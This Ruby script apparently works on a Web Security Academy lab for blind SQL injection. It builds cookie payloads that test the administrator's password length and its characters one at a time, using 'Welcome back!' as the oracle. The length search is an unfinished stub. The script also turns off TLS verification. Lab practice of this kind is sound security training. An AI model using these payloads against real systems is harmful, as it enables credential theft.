require 'uri'
require 'net/http'
require 'openssl'

SESSION_COOKIE = "rYjXpryytVRhVOZaS4Th1QtvGCfczSHg"
TRACKING_ID = "iOiUpdGkE7gfW0eR"
BASE_URI = URI("https://0abe00430482f05584fd634a004300d0.web-security-academy.net/")

CHARS = ('a'..'z').to_a.concat((0..9).to_a)
ASCII_RANGE = (32..126)

def http_client
  http = Net::HTTP.new(BASE_URI.host, BASE_URI.port)
  http.use_ssl = (BASE_URI.scheme = "https")
  http.verify_mode = OpenSSL::SSL::VERIFY_NONE
  http.open_timeout = 5
  http.read_timeout = 10
  http
end

def built_request(injected_tracking_id)
  req = Net::HTTP::Get.new(BASE_URI.request_uri)
  req["Accept"] = "text/html"
  req["Cookie"] = "TrackingId=#{injected_tracking_id}; session=#{SESSION_COOKIE}"
  req
end

def sql_password_length(operator, length)
  "#{TRACKING_ID}' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password) #{operator} #{length})='a"
end

def sql_char_test(pword_char_index, test_ascii_no, operator)
  "#{TRACKING_ID}' AND ASCII((
    SELECT SUBSTRING(password, #{pword_char_index}, 1)
    FROM users
    WHERE username='administrator'
  )) #{operator} '#{test_ascii_no}"
end

def password_length?
  # from 1..30 call sql_password_length
end

def fetch(injected_tracking_id = TRACKING_ID)
  response = http_client.request(built_request(injected_tracking_id))

  puts response.code == '200' ? "Status: ✅ #{response.code} #{response.message}" : "Status: ❌ #{response.code} #{response.message}"
  puts "Content-Type: #{response['content-type']}"
  puts "Body bytes: #{response.body.bytesize}"
  puts welcome_back_present?(response.body) ? "Valid" : "Invalid"
end

def welcome_back_present?(response_body)
  response_body.include?("Welcome back!")
end

fetch